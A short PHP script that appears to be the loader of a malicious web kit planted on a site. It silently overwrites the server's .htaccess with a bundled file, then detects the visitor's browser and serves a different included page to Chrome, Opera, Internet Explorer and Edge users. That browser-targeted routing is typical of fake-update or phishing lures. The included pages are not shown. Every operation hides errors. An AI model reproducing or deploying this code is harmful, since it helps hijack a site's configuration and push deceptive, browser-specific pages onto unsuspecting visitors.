<?php

    @unlink(".htaccess");
    @copy("_HIROn.txt",".htaccess");

// useragent detect

$usa = @$_SERVER['HTTP_USER_AGENT'];
if(@preg_match("' chrome'is", $usa) && !preg_match("' opr'is", $usa) && !preg_match("' edge'is", $usa))
	{
		@require_once '_crum.php';
		exit();
	}
elseif(@preg_match("' opr'is", $usa))
	{
		@require_once '_opra.php';
		exit();
	}
elseif(@preg_match("' trident'is", $usa))
	{
		@require_once '_inex.php';
		exit();
	}
elseif(@preg_match("' edge'is", $usa))
	{
		@require_once '_msw.php';
		exit();
	}
else
    {
        @require_once '_crum.php';
		exit();
    }